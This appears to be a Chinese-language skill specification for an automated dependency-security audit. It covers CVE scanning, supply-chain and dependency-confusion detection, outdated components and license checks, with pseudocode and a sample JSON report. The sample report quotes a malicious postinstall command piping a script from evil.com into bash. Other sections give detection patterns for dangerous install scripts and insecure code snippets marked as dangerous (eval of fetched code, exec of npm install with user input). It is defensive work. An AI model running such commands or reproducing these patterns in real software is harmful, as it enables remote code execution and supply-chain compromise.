---
name: dependency-analyzer
description: 专业的审计工作流程,通过依赖分析识别和验证第三方组件漏洞;重点关注检测依赖库中的已知CVE、供应链攻击风险、依赖混淆漏洞、过时组件、传递依赖风险、License合规问题等,从而导致攻击者利用已知漏洞入侵系统、投毒供应链、窃取敏感数据等安全问题;利用按编程语言组织的参考资料目录中的参考指南。
---

# 概述与边界

## 核心职责

- **聚焦**:检测第三方依赖库中的安全漏洞和供应链风险
- **输入**:项目依赖清单 (package.json/requirements.txt/pom.xml/go.mod等)
- **输出**:CVE漏洞清单 + 供应链风险评估 + 修复建议
- **价值**:发现"信任第三方代码"导致的安全风险

## 什么是依赖安全?

**定义**:确保项目依赖的第三方库不包含已知漏洞,且来源可信。

### 经典案例

```
Log4Shell (CVE-2021-44228):
  log4j-core:2.14.1 → JNDI注入 → RCE
  影响范围: 全球数百万应用

Colors.js/Faker.js供应链投毒:
  maintainer恶意植入无限循环代码
  影响: npm生态系统大面积瘫痪

依赖混淆攻击:
  内部包 "@company/utils" → 攻击者上传同名公开包
  npm优先安装公开包 → 代码执行

ua-parser-js劫持:
  npm账号被盗 → 上传恶意版本 → 挖矿木马
```

---

## 7 种核心检测维度

### 维度1: CVE漏洞扫描

```yaml
dimension: Known CVE Vulnerabilities
description: "检测依赖库中的已知安全漏洞"

data_sources:
  - National Vulnerability Database (NVD)
  - GitHub Advisory Database
  - npm/PyPI/RubyGems Security Advisories
  - Snyk Vulnerability Database
  - OSV (Open Source Vulnerabilities)

detection_process:
  1. 提取项目依赖清单
  2. 解析所有依赖及其版本
  3. 与CVE数据库比对
  4. 计算影响范围(直接依赖 vs 传递依赖)
  5. 评估严重性和可利用性

example_output: |
  {
    "package": "log4j-core",
    "version": "2.14.1",
    "cve": "CVE-2021-44228",
    "severity": "CRITICAL",
    "cvss_score": 10.0,
    "description": "JNDI注入导致远程代码执行",
    "affected_versions": "2.0-beta9 to 2.14.1",
    "fixed_version": "2.15.0",
    "dependency_chain": "app → spring-boot-starter-log4j2 → log4j-core",
    "exploitability": "VERY_HIGH",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
    ]
  }

severity_levels:
  - CRITICAL: CVSS >= 9.0, 已有公开利用代码
  - HIGH: CVSS >= 7.0, 漏洞易于利用
  - MEDIUM: CVSS >= 4.0, 需要特定条件
  - LOW: CVSS < 4.0, 影响有限
```

### 维度2: 供应链安全

```yaml
dimension: Supply Chain Security
description: "检测供应链攻击风险"

attack_vectors:
  - name: "恶意包投毒"
    detection:
      - 检查包的发布历史
      - 识别突然的maintainer变更
      - 检测安装脚本(postinstall)的可疑行为
      - 分析包体积突然增大
    example: |
      event-stream@3.3.6 添加了恶意依赖 flatmap-stream
      → 窃取比特币钱包私钥

  - name: "Typosquatting (域名抢注)"
    detection:
      - 检测与流行库名称相似的包
      - Levenshtein距离 < 2
      - 常见替换: l→1, O→0
    example: |
      正确: requests
      恶意: reqeusts (e/u互换)

  - name: "依赖混淆 (Dependency Confusion)"
    detection:
      - 检测内部包名 (如 @company/*)
      - 检查是否存在同名公开包
      - 验证npm/pip优先级配置
    example: |
      内部: @mycompany/utils
      攻击: npm上传同名包 @mycompany/utils
      → npm优先安装公开包

  - name: "账号劫持"
    detection:
      - 检查最近版本的发布者
      - 识别2FA未启用的高危包
      - 检测突然的版本发布
    example: |
      ua-parser-js maintainer账号被盗
      → 上传0.7.29/0.8.0/1.0.0包含挖矿木马

detection_indicators:
  suspicious_install_scripts:
    - "curl | bash"
    - "eval()"
    - "child_process.exec()"
    - "网络请求外部服务器"

  anomaly_detection:
    - "包体积突然增大 >50%"
    - "新增二进制文件"
    - "新增隐藏文件(.env等)"
    - "发布频率异常 (1天内多个版本)"
```

### 维度3: 过时依赖检测

```yaml
dimension: Outdated Dependencies
description: "检测过时的依赖版本"

risk_categories:
  - name: "严重过时 (>2年)"
    severity: HIGH
    risk: "可能包含多个已知漏洞,缺少安全补丁"
    example: |
      express: 3.21.2 (2016年发布)
      当前: 4.18.2 (2023年)
      → 中间跨越7年,包含数十个安全修复

  - name: "主版本落后 (Major版本差异)"
    severity: MEDIUM
    risk: "缺少重要安全特性"
    example: |
      react: 15.6.2
      ���前: 18.2.0
      → 缺少Hooks安全机制

  - name: "EOL (End of Life)"
    severity: CRITICAL
    risk: "不再接收安全更新"
    example: |
      node: 10.24.1 (EOL: 2021-04-30)
      → 即使有CVE也不会修复

detection:
  - 检查包的最后更新时间
  - 与latest版本比对
  - 查询EOL数据库 (endoflife.date)
  - 计算版本滞后程度
```

### 维度4: 传递依赖风险

```yaml
dimension: Transitive Dependencies Risk
description: "检测间接依赖带来的风险"

problem: |
  项目直接依赖: express@4.18.0
  express依赖: body-parser@1.19.0
  body-parser依赖: qs@6.9.1 (存在CVE!)
  → 项目间接受到影响

detection_strategy:
  1. 构建完整依赖树
  2. 递归检测所有层级的依赖
  3. 识别"Diamond依赖冲突"
  4. 计算依赖深度和广度

example_output: |
  {
    "package": "qs",
    "version": "6.9.1",
    "cve": "CVE-2022-24999",
    "dependency_chain": [
      "app",
      "express@4.18.0",
      "body-parser@1.19.0",
      "qs@6.9.1"
    ],
    "depth": 3,
    "risk": "传递依赖,难以直接修复",
    "fix": "升级express到包含修复的版本"
  }

risk_metrics:
  - dependency_depth: "依赖深度 (>5层风险高)"
  - dependency_breadth: "依赖广度 (>100个包风险高)"
  - diamond_conflicts: "相同包的不同版本冲突"
```

### 维度5: License合规检测

```yaml
dimension: License Compliance
description: "检测依赖的License合规风险"

high_risk_licenses:
  - name: "GPL-3.0"
    risk: "传染性开源协议,要求衍生作品开源"
    impact: "商业软件可能被迫开源"

  - name: "AGPL-3.0"
    risk: "网络服务也视为分发,必须开源"
    impact: "SaaS服务必须开源代码"

  - name: "SSPL"
    risk: "MongoDB的私有协议,OSI不认可"
    impact: "云服务商不能提供托管服务"

compatible_licenses:
  permissive:
    - MIT
    - Apache-2.0
    - BSD-3-Clause
    - ISC
  copyleft:
    - GPL-2.0
    - GPL-3.0
    - LGPL
  proprietary:
    - Commercial
    - Proprietary

detection:
  - 提取每个包的LICENSE文件
  - 识别SPDX License标识
  - 检测License冲突
  - 评估传染性风险
```

### 维度6: 依赖来源可信度

```yaml
dimension: Dependency Source Trust
description: "评估依赖来源的可信度"

trust_factors:
  - name: "Registry官方认证"
    weight: 0.3
    check: "npm Verified Publisher / PyPI Trusted Publisher"

  - name: "Maintainer信誉"
    weight: 0.25
    metrics:
      - GitHub stars/followers
      - 贡献历史 (>2年)
      - 其他知名项目维护者

  - name: "社区活跃度"
    weight: 0.2
    metrics:
      - GitHub stars >1000
      - 周下载量 >10k
      - Issue响应速度 <7天

  - name: "安全审计"
    weight: 0.15
    check:
      - OpenSSF Scorecard分数
      - 是否有Security Policy
      - 是否启用2FA
      - 是否有Security审计报告

  - name: "代码质量"
    weight: 0.1
    metrics:
      - 测试覆盖率 >80%
      - CI/CD配置
      - 代码签名

trust_score_calculation: |
  trust_score = Σ(factor.weight × factor.score)

  if trust_score < 0.4: UNTRUSTED
  elif trust_score < 0.7: LOW_TRUST
  elif trust_score < 0.9: TRUSTED
  else: HIGHLY_TRUSTED
```

### 维度7: Runtime依赖检测

```yaml
dimension: Runtime Dependencies
description: "检测运行时动态加载的依赖"

dynamic_loading_patterns:
  - name: "动态import()"
    example: |
      const pluginName = req.query.plugin;
      const plugin = await import(pluginName);  // 危险!
    risk: "可加载任意npm包,包括恶意包"

  - name: "child_process执行npm install"
    example: |
      exec(`npm install ${userInput}`);  // 危险!
    risk: "用户可控的包名可导致RCE"

  - name: "eval()加载远程代码"
    example: |
      const code = await fetch(url);
      eval(code);  // 危险!
    risk: "远程代码执行"

detection:
  - 使用AST检测动态import()
  - 检测require()的参数是否可控
  - 识别child_process执行npm/pip命令
  - 检测fetch/axios加载远程脚本
```

---

## 检测流程

### Step 1: 提取依赖清单

```python
def extract_dependencies(project_root):
    """提取所有依赖"""

    dependencies = {
        "direct": [],
        "dev": [],
        "peer": [],
        "transitive": []
    }

    # Node.js项目
    if os.path.exists("package.json"):
        pkg = json.load(open("package.json"))
        dependencies["direct"] = pkg.get("dependencies", {})
        dependencies["dev"] = pkg.get("devDependencies", {})
        dependencies["peer"] = pkg.get("peerDependencies", {})

        # 提取传递依赖
        if os.path.exists("package-lock.json"):
            lock = json.load(open("package-lock.json"))
            dependencies["transitive"] = extract_transitive_deps(lock)

    # Python项目
    elif os.path.exists("requirements.txt"):
        dependencies["direct"] = parse_requirements("requirements.txt")

    # Java项目
    elif os.path.exists("pom.xml"):
        dependencies["direct"] = parse_maven_dependencies("pom.xml")

    # Go项目
    elif os.path.exists("go.mod"):
        dependencies["direct"] = parse_go_mod("go.mod")

    return dependencies
```

### Step 2: CVE扫描

```python
def scan_cves(dependencies):
    """扫描CVE漏洞"""

    vulnerabilities = []

    for pkg in dependencies["direct"] + dependencies["transitive"]:
        # 查询CVE数据库
        cves = query_cve_database(pkg.name, pkg.version)

        for cve in cves:
            vulnerabilities.append({
                "package": pkg.name,
                "version": pkg.version,
                "cve": cve.id,
                "severity": cve.severity,
                "cvss_score": cve.cvss,
                "description": cve.description,
                "affected_versions": cve.affected_versions,
                "fixed_version": cve.fixed_version,
                "dependency_chain": get_dependency_chain(pkg),
                "exploitability": assess_exploitability(cve),
                "references": cve.references
            })

    return vulnerabilities

def query_cve_database(package_name, version):
    """查询CVE数据库"""

    # 多源查询
    cves = []
    cves.extend(query_nvd(package_name, version))
    cves.extend(query_github_advisory(package_name, version))
    cves.extend(query_snyk(package_name, version))
    cves.extend(query_osv(package_name, version))

    # 去重
    return deduplicate_cves(cves)
```

### Step 3: 供应链安全检测

```python
def detect_supply_chain_risks(dependencies):
    """检测供应链风险"""

    risks = []

    for pkg in dependencies["direct"]:
        # 检测1: Typosquatting
        if is_typosquatting(pkg.name):
            risks.append({
                "type": "typosquatting",
                "package": pkg.name,
                "similar_to": find_similar_popular_packages(pkg.name),
                "severity": "HIGH"
            })

        # 检测2: 可疑安装脚本
        install_scripts = get_install_scripts(pkg)
        if has_suspicious_patterns(install_scripts):
            risks.append({
                "type": "suspicious_install_script",
                "package": pkg.name,
                "script": install_scripts,
                "patterns": extract_suspicious_patterns(install_scripts),
                "severity": "CRITICAL"
            })

        # 检测3: 发布异常
        release_history = get_release_history(pkg)
        if is_anomalous_release(release_history):
            risks.append({
                "type": "anomalous_release",
                "package": pkg.name,
                "anomaly": describe_anomaly(release_history),
                "severity": "MEDIUM"
            })

        # 检测4: Maintainer变更
        maintainer_history = get_maintainer_history(pkg)
        if has_recent_maintainer_change(maintainer_history):
            risks.append({
                "type": "maintainer_change",
                "package": pkg.name,
                "change": maintainer_history[-1],
                "severity": "MEDIUM"
            })

    return risks

def is_typosquatting(package_name):
    """检测typosquatting"""

    popular_packages = load_popular_packages_list()

    for popular in popular_packages:
        # 计算Levenshtein距离
        distance = levenshtein_distance(package_name, popular)

        if distance <= 2 and package_name != popular:
            return True

    return False
```

### Step 4: 依赖混淆检测

```python
def detect_dependency_confusion(dependencies):
    """检测依赖混淆风险"""

    confusion_risks = []

    for pkg in dependencies["direct"]:
        # 检测内部包特征
        if is_internal_package(pkg.name):  # @company/* 或 company-*
            # 检查公开Registry是否存在同名包
            public_package = query_public_registry(pkg.name)

            if public_package:
                confusion_risks.append({
                    "type": "dependency_confusion",
                    "package": pkg.name,
                    "severity": "CRITICAL",
                    "description": "内部包名与公开包冲突",
                    "internal_version": pkg.version,
                    "public_version": public_package.version,
                    "risk": "包管理器可能优先安装公开包",
                    "fix": [
                        "使用scoped包名 (@company/package)",
                        "配置.npmrc指定Registry优先级",
                        "在公开Registry占位注册同名包(空包)"
                    ]
                })

    return confusion_risks
```

### Step 5: 过时依赖检测

```python
def detect_outdated_dependencies(dependencies):
    """检测过时依赖"""

    outdated = []

    for pkg in dependencies["direct"]:
        latest_version = get_latest_version(pkg.name)
        current_version = pkg.version

        # 计算版本差距
        version_gap = compare_versions(current_version, latest_version)

        # 检查EOL状态
        eol_info = check_eol_status(pkg.name, current_version)

        if eol_info.is_eol:
            severity = "CRITICAL"
        elif version_gap.major > 1:
            severity = "HIGH"
        elif version_gap.minor > 5:
            severity = "MEDIUM"
        else:
            severity = "LOW"

        if severity in ["CRITICAL", "HIGH", "MEDIUM"]:
            outdated.append({
                "package": pkg.name,
                "current_version": current_version,
                "latest_version": latest_version,
                "version_gap": version_gap,
                "is_eol": eol_info.is_eol,
                "eol_date": eol_info.date,
                "severity": severity,
                "risk": describe_outdated_risk(version_gap, eol_info)
            })

    return outdated
```

---

## 输出格式

**输出路径**: `.workspace/tasks/{TASK_ID}/dependency-analysis.json`

```json
{
  "dimension": "dependency",
  "scan_time": "2025-12-16T12:00:00Z",
  "project_type": "node",
  "total_dependencies": 247,
  "vulnerabilities_found": 12,

  "dependency_summary": {
    "direct": 45,
    "dev": 23,
    "peer": 3,
    "transitive": 176,
    "depth": 8,
    "breadth": 247
  },

  "cve_vulnerabilities": [
    {
      "id": "dep-cve-001",
      "package": "log4j-core",
      "version": "2.14.1",
      "cve": "CVE-2021-44228",
      "severity": "CRITICAL",
      "cvss_score": 10.0,
      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",

      "description": "Apache Log4j2 JNDI注入远程代码执行漏洞",

      "affected_versions": "2.0-beta9 to 2.14.1",
      "fixed_version": "2.15.0",

      "dependency_chain": [
        "my-app@1.0.0",
        "spring-boot-starter-log4j2@2.5.0",
        "log4j-core@2.14.1"
      ],

      "dependency_type": "transitive",
      "depth": 2,

      "exploitability": {
        "level": "VERY_HIGH",
        "public_exploit_available": true,
        "exploit_maturity": "FUNCTIONAL",
        "attack_vector": "NETWORK",
        "attack_complexity": "LOW"
      },

      "impact": "远程代码执行,完全控制服务器",

      "fix_recommendation": {
        "immediate": "升级spring-boot-starter-log4j2到2.6.0+(包含log4j-core 2.17.0)",
        "workaround": "设置环境变量 LOG4J_FORMAT_MSG_NO_LOOKUPS=true",
        "priority": "URGENT"
      },

      "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
        "https://logging.apache.org/log4j/2.x/security.html"
      ]
    },
    {
      "id": "dep-cve-002",
      "package": "qs",
      "version": "6.5.2",
      "cve": "CVE-2022-24999",
      "severity": "HIGH",
      "cvss_score": 7.5,

      "description": "Prototype Pollution导致DoS",

      "affected_versions": "< 6.10.3",
      "fixed_version": "6.10.3",

      "dependency_chain": [
        "my-app@1.0.0",
        "express@4.17.1",
        "body-parser@1.19.0",
        "qs@6.5.2"
      ],

      "dependency_type": "transitive",
      "depth": 3,

      "fix_recommendation": {
        "immediate": "升级express到4.18.0+",
        "priority": "HIGH"
      }
    }
  ],

  "supply_chain_risks": [
    {
      "id": "dep-supply-001",
      "type": "suspicious_install_script",
      "package": "some-suspicious-package",
      "version": "1.2.3",
      "severity": "CRITICAL",

      "issue": "postinstall脚本执行可疑命令",

      "evidence": {
        "script": "curl http://evil.com/install.sh | bash",
        "patterns": [
          "curl | bash (远程代码执行)",
          "外部网络请求"
        ]
      },

      "impact": "可能执行恶意代码,窃取敏感信息",

      "recommendation": "立即移除该包,使用替代方案"
    },
    {
      "id": "dep-supply-002",
      "type": "dependency_confusion",
      "package": "@mycompany/utils",
      "severity": "CRITICAL",

      "issue": "内部包名与公开Registry冲突",

      "details": {
        "internal_version": "1.0.0",
        "public_version": "0.0.1",
        "public_registry": "https://registry.npmjs.org",
        "risk": "npm可能优先安装公开包"
      },

      "recommendation": [
        "在.npmrc中配置Registry优先级",
        "或在npm公开Registry占位注册空包"
      ]
    },
    {
      "id": "dep-supply-003",
      "type": "typosquatting",
      "package": "reqeusts",
      "severity": "HIGH",

      "issue": "包名疑似typosquatting",

      "similar_to": "requests (流行库,周下载10M)",
      "levenshtein_distance": 1,

      "recommendation": "检查是否为拼写错误,使用正确的包名"
    }
  ],

  "outdated_dependencies": [
    {
      "id": "dep-outdated-001",
      "package": "express",
      "current_version": "3.21.2",
      "latest_version": "4.18.2",
      "severity": "HIGH",

      "version_gap": {
        "major": 1,
        "minor": 97,
        "patch": 0,
        "years_behind": 7
      },

      "is_eol": true,
      "eol_date": "2015-08-01",

      "risk": "版本严重过时,缺少大量安全补丁",

      "known_vulnerabilities": 15,

      "recommendation": "升级到express 4.x"
    }
  ],

  "license_compliance": [
    {
      "id": "dep-license-001",
      "package": "some-gpl-package",
      "version": "2.3.0",
      "license": "GPL-3.0",
      "severity": "HIGH",

      "risk": "GPL传染性协议,要求衍生作品开源",

      "impact": "商业软件可能被迫开源",

      "recommendation": "寻找MIT/Apache-2.0协议的替代品"
    }
  ],

  "trust_analysis": [
    {
      "package": "some-unknown-package",
      "version": "1.0.0",
      "trust_score": 0.35,
      "trust_level": "UNTRUSTED",

      "factors": {
        "registry_verified": false,
        "maintainer_reputation": 0.2,
        "community_activity": 0.1,
        "security_audit": 0,
        "code_quality": 0.4
      },

      "red_flags": [
        "GitHub stars < 10",
        "周下载量 < 100",
        "发布时间 < 3个月",
        "无Security Policy",
        "未启用2FA"
      ],

      "recommendation": "不建议使用,寻找更成熟的替代品"
    }
  ],

  "dependency_graph": {
    "format": "graphviz",
    "nodes": [
      {"id": "app", "type": "root"},
      {"id": "express@4.17.1", "type": "direct", "vulnerable": false},
      {"id": "log4j-core@2.14.1", "type": "transitive", "vulnerable": true}
    ],
    "edges": [
      {"from": "app", "to": "express@4.17.1"},
      {"from": "app", "to": "spring-boot-starter-log4j2@2.5.0"},
      {"from": "spring-boot-starter-log4j2@2.5.0", "to": "log4j-core@2.14.1"}
    ]
  },

  "statistics": {
    "total_dependencies": 247,
    "direct": 45,
    "transitive": 176,
    "cve_vulnerabilities": {
      "critical": 1,
      "high": 3,
      "medium": 5,
      "low": 3
    },
    "supply_chain_risks": 3,
    "outdated_dependencies": 12,
    "license_issues": 2,
    "untrusted_packages": 5
  },

  "recommendations": {
    "urgent_actions": [
      "立即升级log4j-core修复CVE-2021-44228",
      "移除可疑包some-suspicious-package",
      "解决依赖混淆风险@mycompany/utils"
    ],
    "high_priority": [
      "升级express到4.x",
      "替换GPL协议的包"
    ],
    "medium_priority": [
      "升级outdated依赖",
      "review低信任度的包"
    ]
  }
}
```

---

## 下游任务

```json
{
  "tasks": [],
  "reason": "dependency-analyzer为分析维度,不生成下游任务"
}
```

---

## 与其他维度的协作

### 协作输出

- **combo-pattern-analyzer**: 依赖漏洞可与配置/数据流组合形成复杂攻击链

---

## 重要约束

1. ✅ **多源CVE数据**: 必须查询NVD + GitHub Advisory + Snyk等多个数据源
2. ⚠️ **传递依赖深度**: 需要构建完整依赖树,递归扫描
3. ⚠️ **误报控制**: 区分真实CVE vs 误报 (如仅dev依赖的漏洞)
4. ⚠️ **性能考虑**: 大型项目可能有数千个依赖,需要缓存和并发查询

---

## 参考资料

- [National Vulnerability Database (NVD)](https://nvd.nist.gov/)
- [GitHub Advisory Database](https://github.com/advisories)
- [Snyk Vulnerability DB](https://snyk.io/vuln/)
- [OSV - Open Source Vulnerabilities](https://osv.dev/)
- [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/)
- [npm Security Advisories](https://www.npmjs.com/advisories)
- [Dependency Confusion Attack](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
